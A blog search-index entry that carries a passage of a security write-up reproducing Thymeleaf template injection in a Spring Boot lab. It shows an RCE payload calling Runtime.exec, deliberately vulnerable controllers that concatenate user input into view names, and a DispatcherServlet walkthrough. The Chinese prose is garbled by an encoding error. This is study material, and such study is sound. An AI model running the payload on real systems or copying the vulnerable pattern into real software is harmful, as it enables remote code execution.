<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Thymeleafæ¨¡æ¿æ³¨å…¥</title>
    <link href="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="Thymeleafæ¨¡æ¿æ³¨å…¥"><a href="#Thymeleafæ¨¡æ¿æ³¨å…¥" class="headerlink" title="Thymeleafæ¨¡æ¿æ³¨å…¥"></a>Thymeleafæ¨¡æ¿æ³¨å…¥</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>çœ‹åˆ«äººçš„ï¼Œæƒ³å¤ç°å­¦ä¹ ä¸€ä¸‹ï¼ŒåŠªåŠ›æ··å£é¥­åƒï¼Œè¦å­¦çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œä¸€ä¸ªä¸ªæ¥å§</p><p>ç¯å¢ƒæ˜¯ï¼šspringboot2.3.2.RELEASE + spring-boot-starter-thymeleafï¼ˆthymeleafçš„ç‰ˆæœ¬æ˜¯3.0.11ï¼‰</p><h3 id="0x01-Thymeleafç®€ä»‹"><a href="#0x01-Thymeleafç®€ä»‹" class="headerlink" title="0x01 Thymeleafç®€ä»‹"></a>0x01 Thymeleafç®€ä»‹</h3><p>Thymeleaf æ˜¯ä¸€ç§é€‚ç”¨äº Web å’Œç‹¬ç«‹ç¯å¢ƒçš„ç°ä»£æœåŠ¡å™¨ç«¯ Java æ¨¡æ¿å¼•æ“ï¼Œèƒ½å¤Ÿå¤„ç† HTMLã€XMLã€JavaScriptã€CSS ç”šè‡³çº¯æ–‡æœ¬ã€‚</p><p>Thymeleaf çš„ä¸»è¦ç›®æ ‡æ˜¯æä¾›ä¸€ç§ä¼˜é›…ä¸”é«˜åº¦å¯ç»´æŠ¤çš„æ¨¡æ¿åˆ›å»ºæ–¹å¼ã€‚ä¸ºå®ç°è¿™ä¸€ç‚¹ï¼Œå®ƒå»ºç«‹åœ¨<em>è‡ªç„¶æ¨¡æ¿</em>çš„æ¦‚å¿µä¹‹ä¸Šï¼Œä»¥ä¸å½±å“æ¨¡æ¿ç”¨ä½œè®¾è®¡åŸå‹çš„æ–¹å¼å°†å…¶é€»è¾‘æ³¨å…¥æ¨¡æ¿æ–‡ä»¶ã€‚</p><h4 id="æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•"><a href="#æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•" class="headerlink" title="æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•"></a>æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•</h4><p>thymeleafä¸­æ”¯æŒå¤šç§è¡¨è¾¾å¼ï¼Œè¿™ä¹Ÿæ˜¯thymeleafåŠŸèƒ½å¼ºçš„é‡è¦åŸå› ä¹‹ä¸€</p><ul><li><code>#&#123;...&#125;</code>    æ¶ˆæ¯è¡¨è¾¾å¼</li><li><code>$&#123;...&#125;</code>    å˜é‡è¡¨è¾¾å¼ï¼ˆå®é™…ä¸Šæ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­åŒ…å«çš„å˜é‡æ˜ å°„ä¸Šæ‰§è¡Œçš„ OGNLï¼ˆå¯¹è±¡å›¾å¯¼èˆªè¯­è¨€ï¼‰è¡¨è¾¾å¼ï¼‰</li><li><code>*&#123;...&#125;</code>    é€‰æ‹©è¡¨è¾¾å¼ï¼ˆå’Œå˜é‡è¡¨è¾¾å¼ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºè®¡ç®—<strong>é€‰å®šå¯¹è±¡</strong>ä¸Šçš„è¡¨è¾¾å¼è€Œä¸æ˜¯æ•´ä¸ªä¸Šä¸‹æ–‡ã€‚ï¼‰</li><li><code>@&#123;...&#125;</code>    é“¾æ¥ç½‘å€</li><li><code>~&#123;...&#125;</code>    ç‰‡æ®µè¡¨è¾¾å¼ï¼ˆè¡¨ç¤ºæ ‡è®°ç‰‡æ®µå¹¶åœ¨æ¨¡æ¿ä¸­ç§»åŠ¨å®ƒä»¬çš„ç®€å•æ–¹æ³•ï¼‰</li></ul><p>é™¤äº†æ‰€æœ‰è¿™äº›ç”¨äºè¡¨è¾¾å¼å¤„ç†çš„åŠŸèƒ½ä¹‹å¤–ï¼ŒThymeleaf è¿˜å…·æœ‰<strong>é¢„å¤„ç†</strong>è¡¨è¾¾å¼çš„åŠŸèƒ½ã€‚</p><h4 id="Thymeleafçš„é¢„å¤„ç†"><a href="#Thymeleafçš„é¢„å¤„ç†" class="headerlink" title="Thymeleafçš„é¢„å¤„ç†"></a>Thymeleafçš„é¢„å¤„ç†</h4><p>é¢„å¤„ç†æ˜¯åœ¨æ­£å¸¸è¡¨è¾¾å¼ä¹‹å‰æ‰§è¡Œçš„è¡¨è¾¾å¼ï¼Œå®ƒå…è®¸ä¿®æ”¹æœ€ç»ˆå°†è¦æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚</p><p>é¢„å¤„ç†è¡¨è¾¾å¼ä¸æ™®é€šè¡¨è¾¾å¼å®Œå…¨ä¸€æ ·ï¼Œä½†å‡ºç°åœ¨åŒä¸‹åˆ’çº¿ç¬¦å·ï¼ˆå¦‚<code>__$&#123;expression&#125;__</code>ï¼‰çš„åŒ…å›´ä¸­ã€‚</p><p>ç”±äºæ˜¯ä½¿ç”¨çš„springboot+thymeleafè¿›è¡Œçš„å¤ç°ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨çš„ä¹Ÿå°±æ˜¯springELè¡¨è¾¾å¼</p><h3 id="0x02-æ¼æ´æˆå› "><a href="#0x02-æ¼æ´æˆå› " class="headerlink" title="0x02 æ¼æ´æˆå› "></a>0x02 æ¼æ´æˆå› </h3><p>Thymeleafçš„æ”¯æŒè¡¨è¾¾å¼é¢„å¤„ç†ï¼Œå½“è¿›å…¥Thymeleafè§†å›¾è§£æå™¨çš„Viewä¸­åŒ…å«<code>__$&#123;expression&#125;__</code>è¿™ç§å½¢å¼çš„è¯­å¥æ—¶ï¼ŒThymeleafä¼šè®¤ä¸ºæ­¤å¤„éœ€è¦è¿›è¡Œ<strong>é¢„å¤„ç†</strong>ï¼Œå½“åœ¨<code>expression</code>å¤„ä¼ å…¥æ¶æ„ä»£ç æ—¶ï¼Œå°±å¯ä»¥å®ç°æ”»å‡»ï¼Œä½†æ­¤ç±»æ¼æ´çš„åˆ©ç”¨åœºæ™¯è¾ƒä¸ºå°‘è§ï¼ˆå¯èƒ½æ˜¯æˆ‘è§çš„å°‘ğŸ˜­ï¼‰ï¼Œå¸¸è§çš„æƒ…å†µä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/test/&#123;path&#125;&quot;)</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">vulTest02</span><span class="hljs-params">()</span></span>&#123;<br>    log.info(<span class="hljs-string">&quot;Test02&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x03-å¤ç°åˆ†æ"><a href="#0x03-å¤ç°åˆ†æ" class="headerlink" title="0x03 å¤ç°åˆ†æ"></a>0x03 å¤ç°åˆ†æ</h3><h4 id="åœºæ™¯1"><a href="#åœºæ™¯1" class="headerlink" title="åœºæ™¯1"></a>åœºæ™¯1</h4><p><strong>exp</strong>ï¼š<code>::__$&#123;new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()&#125;__</code></p><p><strong>Thymeleafç‰ˆæœ¬ï¼š3.0.11</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- pom.xml --&gt;</span><br><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.2.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mechoy<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>ThymeleafDemo<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">excludes</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">exclude</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">exclude</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">excludes</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æµ‹è¯•Thymeleafæ¨¡æ¿æ³¨å…¥<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">th:action</span>=<span class="hljs-string">&quot;@&#123;/test&#125;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;path&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;payload&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> </span>&#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/test&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">vulTest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String path)</span></span>&#123;<br>        log.info(<span class="hljs-string">&quot;path:&quot;</span> + path);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xxx/&quot;</span> + path + <span class="hljs-string">&quot;/zzz&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥ä»<code>org.springframework.web.servlet.DispatcherServlet</code>å¼€å§‹è¿›è¡Œåˆ†æ</p><p>ä»DispatcherServletã€å‰ç½®æ§åˆ¶å™¨ã€‘å¼€å§‹ï¼Œå¦‚è¿‡å¯¹SpringMVCæ¯”è¾ƒç†Ÿæ‚‰å¯ä»¥ç›´æ¥F8ï¼Œä¸ç†Ÿæ‚‰çš„è¯ï¼Œå¯ä»¥åƒæˆ‘ä¸€æ ·ï¼Œé€‰æ‹©æ€§ä¸çœ‹ğŸ˜…ï¼Œè¿™é‡Œæœ‰ä¸ªç®€å•çš„å…³äºdoDispatchçš„è¯´æ˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    HttpServletRequest processedRequest = request;<br>    HandlerExecutionChain mappedHandler = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">boolean</span> multipartRequestParsed = <span class="hljs-keyword">false</span>;<br>    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ModelAndView mv = <span class="hljs-keyword">null</span>;<br>            Object dispatchException = <span class="hljs-keyword">null</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯æ–‡ä»¶ä¸Šä¼ è¯·æ±‚</span><br>                processedRequest = <span class="hljs-keyword">this</span>.checkMultipart(request);<br>                multipartRequestParsed = processedRequest != request;<br>                <span class="hljs-comment">// checkMultipart() å½“ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ çš„è¯·æ±‚æ—¶ï¼Œä¸ä¼šåšä»»ä½•æ“ä½œ</span><br>                mappedHandler = <span class="hljs-keyword">this</span>.getHandler(processedRequest);<br>                <span class="hljs-comment">// å¦‚æœæ²¡æœ‰ç¬¦åˆè¯¥è¯·æ±‚çš„é€‚é…å™¨(mapperHandler),å°†ä¼šç›´æ¥è¿”å›404</span><br>                <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-keyword">null</span>) &#123;<br>                    <span class="hljs-keyword">this</span>.noHandlerFound(processedRequest, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-comment">// è·å–ä¸è¯·æ±‚ç›¸ç¬¦çš„HandlerAdapterï¼ˆé€‚é…å™¨ï¼‰</span><br>                HandlerAdapter ha = <span class="hljs-keyword">this</span>.getHandlerAdapter(mappedHandler.getHandler());<br>                String method = request.getMethod();<span class="hljs-comment">// è·å–è¯·æ±‚æ–¹æ³•</span><br>                <span class="hljs-keyword">boolean</span> isGet = HttpMethod.GET.matches(method); <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦ä¸ºgetæ–¹æ³•</span><br>                <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯HttpMethodä¸­å­˜åœ¨çš„æ–¹æ³•,è¯·æ±‚æ–¹æ³•ä¸ºGETåˆ™è¿›å…¥</span><br>                <span class="hljs-keyword">if</span> (isGet || HttpMethod.HEAD.matches(method)) &#123;<br>                    <span class="hljs-keyword">long</span> lastModified = ha.getLastModified(request, mappedHandler.getHandler());<br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">new</span> ServletWebRequest(request, response)).checkNotModified(lastModified) &amp;&amp; isGet) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-comment">// æ‹¦æˆªå™¨ï¼Œæ‰§è¡ŒpreHandleæ‹¦æˆªå™¨</span><br>                <span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-comment">// æ‰§è¡ŒControllerã€è¯·æ±‚å¤„ç†å™¨ã€‘ä¸­çš„ç›¸åº”æ–¹æ³•ã€å¤„ç†è¯·æ±‚ï¼Œåšå‡ºå“åº”ã€‘</span><br>                mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br>                <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><span class="hljs-comment">// è·å–è§†å›¾View</span><br>                <span class="hljs-keyword">this</span>.applyDefaultViewName(processedRequest, mv);<br>                <span class="hljs-comment">// æ‹¦æˆªå™¨åç½®å¤„ç†</span><br>                mappedHandler.applyPostHandle(processedRequest, response, mv);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var20) &#123;<br>                dispatchException = var20;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable var21) &#123;<br>                dispatchException = <span class="hljs-keyword">new</span> NestedServletException(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, var21);<br>            &#125;<br>            <span class="hljs-comment">// åˆ©ç”¨mvè¿›è¡Œé¡µé¢æ¸²æŸ“</span><br>            <span class="hljs-keyword">this</span>.processDispatchResult(processedRequest, response, mappedHandler, mv, (Exception)dispatchException);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>            <span class="hljs-keyword">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, var22);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var23) &#123;<br>            <span class="hljs-comment">// å®Œæˆé¡µé¢æ¸²æŸ“å¹¶è°ƒç”¨æ‹¦æˆªå™¨çš„afterCompletion()</span><br>            <span class="hljs-keyword">this</span>.triggerAfterCompletion(processedRequest, response, mappedHandler, <span class="hljs-keyword">new</span> NestedServletException(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, var23));<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æ˜¯å¼‚æ­¥è¯·æ±‚</span><br>        <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>            <span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-keyword">null</span>) &#123;<br>                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>            <span class="hljs-comment">// åˆ é™¤ä¸Šä¼ 